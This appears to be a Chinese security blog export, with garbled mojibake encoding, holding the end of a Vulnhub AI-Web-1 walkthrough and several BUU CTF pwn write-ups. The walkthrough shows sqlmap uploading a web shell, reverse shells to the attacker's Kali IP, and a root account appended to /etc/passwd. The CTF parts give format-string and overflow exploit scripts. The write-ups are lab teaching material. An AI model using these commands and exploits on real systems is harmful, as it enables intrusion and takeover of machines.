<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>--file-read</code>ï¼šä»åç«¯<code>DBMS</code>æ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶</strong></li>
<li><strong><code>--file-write</code>ï¼šåœ¨åç«¯<code>DBMS</code>æ–‡ä»¶ç³»ç»Ÿä¸Šå†™å…¥æœ¬åœ°æ–‡ä»¶</strong></li>
<li><strong><code>--file-dest</code>ï¼šè¦å†™å…¥çš„æ–‡ä»¶åœ¨<code>DBMS</code>ä¸Šçš„ç»å¯¹è·¯å¾„</strong></li>
</ul>
<p>ç„¶åä½¿ç”¨èšå‰‘è¿æ¥</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255001.png" alt="image-20241119210041331" style="zoom:50%;" />

<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹<code>shell</code></h3><p>åœ¨<code>kali</code>æœ¬åœ°ç›‘å¬ <code>nc -lvvp 6666</code></p>
<p>åœ¨èšå‰‘è™šæ‹Ÿç»ˆç«¯ä¸Š<code>nc</code>åå¼¹ï¼Œå‘ç°å‚æ•°<code>-e</code>ä¸å¯ç”¨</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.30.130 6666</span><br><span class="line"><span class="comment">#192.168.30.130æ˜¯kaliçš„IPåœ°å€</span></span><br></pre></td></tr></table></figure>

<p>åœ¨èšå‰‘ç»ˆç«¯ä¸Šåˆ›å»ºåå‘<code>shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.30.130 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>mkfifo /tmp/f</code>ï¼šåˆ›å»ºä¸€ä¸ªå‘½ä»¤ç®¡é“(<code>FIFO</code>)ï¼Œå‘½åä¸º<code>/tmp/f</code>ã€‚å‘½åç®¡é“å…è®¸è¿›ç¨‹é—´çš„é€šä¿¡ã€‚</strong></li>
<li><strong><code>cat /tmp/f</code>ï¼šè¯»å–<code>/tmp/f</code>æ–‡ä»¶çš„å†…å®¹ã€‚ç”±äº<code>/tmp/f</code>æ˜¯ä¸€ä¸ªå‘½åç®¡é“ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šç­‰å¾…æ•°æ®è¢«å†™å…¥ç®¡é“ã€‚</strong></li>
<li><strong><code>/bin/sh -i</code>ï¼šå¯åŠ¨ä¸€ä¸ªäº¤äº’å¼çš„<code>shell</code>ã€‚<code>-i</code>å‚æ•°è¡¨ç¤ºäº¤äº’å¼æ¨¡å¼ã€‚</strong></li>
<li><strong><code>2&gt;&amp;1</code>ï¼šå°†æ ‡å‡†é”™è¯¯(<code>stderr</code>)é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º(<code>stdout</code>)ã€‚è¿™æ„å‘³ç€æ‰€æœ‰é€šè¿‡<code>shell</code>äº§ç”Ÿçš„é”™è¯¯æ¶ˆæ¯ä¹Ÿä¼šè¢«å‘é€åˆ°åŒä¸€ä¸ªè¾“å‡ºã€‚</strong></li>
<li><strong><code>| nc 192.168.30.130 6666</code>ï¼šå°†<code>cat</code>å‘½ä»¤çš„è¾“å‡º(å³<code>shell</code>çš„è¾“å…¥)è¿‡ç®¡é“ä¼ é€’ç»™ <code>nc</code>(<code>netcat</code>)å‘½ä»¤ã€‚<code>nc</code>å‘½ä»¤è¿æ¥åˆ° IP åœ°å€ <code>192.168.0.103</code>çš„<code>6666</code>ç«¯å£ï¼Œå¹¶å°†æ•°æ®å‘é€åˆ°è¯¥ç«¯å£ã€‚</strong></li>
<li><strong><code>&gt;/tmp/f</code>ï¼šå°†<code>nc</code>å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°<code>/tmp/f</code>æ–‡ä»¶ã€‚è¿™æ ·ï¼Œ<code>cat /tmp/f</code>å‘½ä»¤å°±ä¼šè¯»å–è¿™äº›æ•°æ®ï¼Œå¹¶å°†å…¶ä½œä¸ºè¾“å…¥ä¼ é€’ç»™<code>/bin/sh -i</code>ï¼Œä»è€Œå…è®¸è¿œç¨‹ç”¨æˆ·é€šè¿‡<code>nc</code>å‘é€çš„å‘½ä»¤æ¥æ§åˆ¶<code>shell</code>ã€‚</strong></li>
</ul>
<p>æˆåŠŸåå¼¹<code>shell</code>ï¼Œä½†ä¾æ—§æƒé™è¾ƒä½</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255431.png" alt="image-20241119214828802" style="zoom:67%;" />

<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¿›å…¥äº¤äº’å¼<code>shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æœç´¢å±äº<code>root</code>ç”¨æˆ·ä¸”å…·æœ‰<code>setuid</code>æƒé™ä½çš„æ–‡ä»¶</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment">#æŒ‡å®šèµ·å§‹ç›®å½•ä¸ºæ ¹ç›®å½•ã€æœç´¢çš„æ–‡ä»¶æ‰€æœ‰è€…ä¸ºrootç”¨æˆ·ã€æŸ¥æ‰¾å…·æœ‰setuidä½çš„æ–‡ä»¶ã€‚(setuidæƒé™ä½å…è®¸ç”¨æˆ·ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ‰§è¡Œæ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæå‡æƒé™)</span></span><br><span class="line"><span class="comment"># -printï¼šè¡¨ç¤ºå°†æœç´¢ç»“æœæ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚</span></span><br><span class="line"><span class="comment"># 2&gt;/dev/nullï¼šå°†é”™è¯¯æ¶ˆæ¯é‡å®šå‘åˆ° /dev/nullï¼Œè¿™æ„å‘³ç€å¿½ç•¥æ‰€æœ‰é”™è¯¯ä¿¡æ¯ã€‚</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256673.png" alt="image-20241119221024659"></p>
<h4 id="æ·»åŠ rootè´¦å·"><a href="#æ·»åŠ rootè´¦å·" class="headerlink" title="æ·»åŠ rootè´¦å·"></a>æ·»åŠ <code>root</code>è´¦å·</h4><p> ç”Ÿæˆ<code>Linux</code>ç³»ç»Ÿç”¨æˆ·å¯†é’¥</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt jt 5799</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256383.png" alt="image-20241119222550002"  />

<p> è¯»å†™<code>/etc/passwd</code>æ–‡ä»¶</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;jt:$1$jt$iCU3U.0M3WJQhDq5RlET00:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>ç™»å½•è´¦å·</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">su jt</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256265.png" alt="image-20241119222807809" style="zoom: 50%;" />

<h3 id="æŸ¥çœ‹flag"><a href="#æŸ¥çœ‹flag" class="headerlink" title="æŸ¥çœ‹flag"></a>æŸ¥çœ‹<code>flag</code></h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256776.png" alt="image-20241119222927834" style="zoom:50%;" />

<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>[çœ‹å®Œè¿™ç¯‡ æ•™ä½ ç©è½¬æ¸—é€æµ‹è¯•é¶æœºvulnhubâ€”â€”Ai-Web1](<a href="https://blog.csdn.net/Aluxian_/article/details/124434294">çœ‹å®Œè¿™ç¯‡ æ•™ä½ ç©è½¬æ¸—é€æµ‹è¯•é¶æœºvulnhubâ€”â€”Ai-Web1-CSDNåšå®¢</a>)</p>
<p>[Vulnhubé¶æœºæ¸—é€ä¹‹ AI: Web: 1](<a href="https://blog.csdn.net/Waffle666/article/details/118962742">Vulnhubé¶æœºæ¸—é€ä¹‹ AI: Web: 1_åå¼¹shellæœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸äº†ai:web:1-CSDNåšå®¢</a>)</p>
]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUåˆ·é¢˜è®°å½•</title>
    <url>/2024/01/06/BUU%E5%88%B7%E9%A2%98/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>è¿˜æ˜¯buuåˆ·é¢˜è®°å½•ï¼Œä¸è¿‡è¿™ä¸ªè®°å½•çš„é¢˜ç›®éƒ½æ˜¯è®©æˆ‘å­¦åˆ°çš„å†…å®¹æ›´å¤šçš„é¢˜ï¼Œå€¼å¯¹ä¸€ç¯‡å•ç‹¬çš„æ–‡ç« ã€‚</p>
<p>[]<del>(ï¿£â–½ï¿£)</del>*</p>
<span id="more"></span>

<h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="ä¿æŠ¤-æºç "><a href="#ä¿æŠ¤-æºç " class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h2><p>ä¿æŠ¤ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png" alt="image-20240710110220628" style="zoom:67%;" />

<p>æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>â€‹	ç¨‹åºä¸­æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†åªèƒ½æ‰§è¡Œä¸€æ¬¡æ ¼å¼åŒ–æ¼æ´å‡½æ•°ï¼Œæœ‰<code>system</code>å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>printf(format)</code>åé¢<code>main</code>å‡½æ•°å°±æ‰§è¡Œå®Œäº†ï¼Œæ‰€ä»¥ä¸ç®¡æˆ‘ä»¬ä¿®æ”¹å“ªä¸€ä¸ªå‡½æ•°çš„<code>got</code>è¡¨å€¼ä¸º<code>system@plt</code>çš„åœ°å€ï¼Œéƒ½ä¸è¡Œã€‚åæ¥çœ‹<code>wp</code>ï¼Œå‘ç°æˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>fini_array</code>çš„å‡½æ•°æŒ‡é’ˆä¸º<code>main</code>å‡½æ•°åœ°å€ï¼Œè¿™æ ·å°±èƒ½å†æ‰§è¡Œä¸€æ¬¡<code>main</code>å‡½æ•°äº†ã€‚</p>
<p>â€‹	åˆšå¼€å§‹ç”¨ä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼Œæ³„æ¼æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°åœ¨æ ˆä¸­çš„åç§»é‡ï¼Œä»¥ä¸ºæ˜¯<code>4</code>ï¼Œä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•çš„æ—¶å€™æŸ¥çœ‹æ ˆä¸­çš„å€¼ï¼Œå‘ç°æ ˆä¸­çš„ç¬¬<code>1,2</code>å’Œ<code>5</code>ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç¡®å®šå‡†ç¡®çš„åç§»é‡</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053168.png" alt="image-20240305185357092"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102943.png" alt="image-20240710110200865"></p>
<p>â€‹	ç„¶åæˆ‘å‘é€ä¸‹é¢è¿™ä¸ª<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabbbb&#x27;</span>+<span class="string">b&#x27;%p%p%p%p%p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	ç°åœ¨å¯ä»¥çœ‹å‡ºæ³„æ¼çš„ç¬¬<code>1</code>ä¸ªå‚æ•°åœ°å€æ˜¯æ ˆä¸­çš„ç¬¬<code>2</code>ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è®¡ç®—åç§»é‡çš„æ—¶å€™è¦ä»<code>02</code>è¿™ä¸ªåºå·å¼€å§‹å¾€ä¸‹æ•°</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053159.png" alt="image-20240305185704092"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sw1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26399</span>)</span><br><span class="line"><span class="comment">#debug(p,0x80485A8)</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sw1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048534</span></span><br><span class="line">fini_array_addr = <span class="number">0x0804979C</span></span><br><span class="line">printf_got = <span class="number">0x0804989c</span></span><br><span class="line">sys_plt = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)+p32(printf_got)+p32(fini_array_addr)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">12</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%4$hn&#x27;</span></span><br><span class="line"><span class="comment">#è¿™é‡Œè¿˜è¦å‡å»12ï¼Œå› ä¸ºå‰é¢å‘é€çš„3ä¸ªåœ°å€ä¸€å…±12ä¸ªå­—èŠ‚</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101049.png" alt="image-20240710110144974"></p>
<h1 id="qctf-2018-dice-game"><a href="#qctf-2018-dice-game" class="headerlink" title="qctf_2018_dice_game"></a><code>qctf_2018_dice_game</code></h1><p>â€‹	åˆ†æç¨‹åºï¼ŒçŒœéšæœºæ•°ï¼ŒçŒœå¯¹äº†å°±èƒ½æ‹¿åˆ°<code>flag</code>ã€‚æœ¬é¢˜æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨æº¢å‡ºè¦†ç›–<code>seed</code>çš„å€¼ï¼Œç„¶åä½¿å…¶ä¸ºå®šå€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ‹¿åˆ°<code>50</code>ä¸ªéšæœºæ•°ï¼Œç„¶åå‘é€ã€‚ç¬¬<code>2</code>ç§æ–¹æ³•æ˜¯è‡ªå·±èµ·ä¸€ä¸ªç”Ÿæˆéšæœºæ•°çš„ç¨‹åºï¼Œåœ¨ç”Ÿæˆéšæœºæ•°çš„åŒæ—¶å‘é€éšæœºæ•°ï¼ŒåŒæ ·ä¹Ÿèƒ½å¾—åˆ°<code>flag</code>ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240306124511429" style="zoom:80%;" />

<h2 id="æ³•1"><a href="#æ³•1" class="headerlink" title="æ³•1"></a>æ³•1</h2><p>â€‹	å…ˆè¯´ç¬¬<code>1</code>ç§ï¼Œç¨‹åºä¸­ç¬¬<code>13</code>è¡Œæœ‰ä¸€ä¸ªæº¢å‡ºç‚¹ï¼Œ<code>read</code>è¯»å…¥<code>0x50</code>ä¸ªå­—èŠ‚åˆ°<code>buf</code>ä¸­ï¼Œå¯ä»¥ç®—å‡º<code>buf</code>è·ç¦»<code>seed</code>çš„åç§»é‡ä¸º<code>0x40</code>ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¦†ç›–<code>seed</code>ï¼Œä½¿å…¶ä¸ºå®šå€¼ï¼Œæ³¨æ„è¿™é‡Œè¦†ç›–è¦åœ¨<code>seed = time(0LL)</code>ä¹‹åã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053695.png" alt="image-20240306131031947" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>â€‹	æ­¤æ—¶å·²ç»è¦†ç›–<code>seed</code>ä¸º<code>0</code>ï¼Œç„¶åå†™ä¸€ä¸ª<code>c</code>è¯­è¨€ç¨‹åºæ‰“å°å‡ºç§å­<code>seed</code>ä¸º<code>0</code>æ—¶ï¼Œç”Ÿæˆçš„å‰<code>50</code>ä¸ªéšæœºæ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,v2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101669.png" alt="image-20240710110124591"></p>
<p>æœ€å<code>exp</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./q&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">v2=<span class="string">&quot;25426251423232651155634433322261116425254446323361&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v2:</span><br><span class="line">    p.sendline(i)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="æ³•2"><a href="#æ³•2" class="headerlink" title="æ³•2"></a>æ³•2</h2><p>â€‹	è¿™ä¸€ç§æ–¹æ³•æ˜¯æœ€å¸¸è§çš„ï¼Œä¹Ÿæ˜¯æœ€å®¹æ˜“æƒ³åˆ°çš„ï¼Œå°±æ˜¯è‡ªå·±èµ·ä¸€ä¸ªç”Ÿæˆéšæœºæ•°çš„ç¨‹åºï¼Œåœ¨ç”Ÿæˆéšæœºæ•°çš„åŒæ—¶å‘é€éšæœºæ•°ï¼ŒåŒæ ·ä¹Ÿèƒ½å¾—åˆ°<code>flag</code>ã€‚</p>
<p>ç”Ÿæˆéšæœºæ•°çš„<code>c</code>ç¨‹åº<code>rand.c</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">2</span>];</span><br><span class="line">    *seed = time(<span class="number">0LL</span>);</span><br><span class="line">    srand(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;======&gt;&gt;&gt;%d\n&quot;</span>,v2);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#debug(p,&quot;pie&quot;,0x0000000000000C44)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./q&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28649</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;ome, let me know your name:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">a = process(<span class="string">&quot;./rand&quot;</span>)</span><br><span class="line">         </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):     </span><br><span class="line">    a.recvuntil(<span class="string">&quot;==&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    value = a.recvline(<span class="literal">False</span>).decode()  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;me the point(1~6): &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053805.png" alt="image-20240306133033057"></p>
<h1 id="canary-linkctf-2018-7-babypie"><a href="#canary-linkctf-2018-7-babypie" class="headerlink" title="(canary)linkctf_2018.7_babypie"></a><code>(canary)linkctf_2018.7_babypie</code></h1><h2 id="ä¿æŠ¤-æºç -1"><a href="#ä¿æŠ¤-æºç -1" class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h2><p>ä¿æŠ¤ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101413.png" alt="image-20240710110101339" style="zoom:67%;" />

<p>æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_960</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s:\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_A3E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>â€‹	ç¨‹åºä¸­ç›´æ¥ç»™äº†åé—¨å‡½æ•°ï¼Œå¯ä»¥æ ˆæº¢å‡ºï¼Œé¦–å…ˆæ•´ä½“æ€è·¯å°±æ˜¯è¦†ç›–<code>main</code>å‡½æ•°è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°åœ°å€ã€‚ä½†æ˜¯å¼€äº†<code>canary</code>å’Œ<code>PIE</code>ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥è¦çœ‹çœ‹æ˜¯å¦èƒ½ç»•è¿‡è¿™ä¸¤ä¸ªä¿æŠ¤ã€‚</p>
<p>â€‹	é¦–å…ˆæ˜¯<code>PIE</code>ä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åé—¨å‡½æ•°åœ°å€ä¸åŸå…ˆåœ°å€åªæœ‰æœ€å<code>1</code>ä¸ªå­—èŠ‚ä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åªè¦†ç›–è¿”å›åœ°å€çš„æœ€åä¸€ã€<code>1</code>ä¸ªå­—èŠ‚ï¼Œè¿›è€Œæ§åˆ¶æ‰§è¡Œæµæ‰§è¡Œåé—¨å‡½æ•°ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053191.png" alt="image-20240309162057963" style="zoom:67%;" />

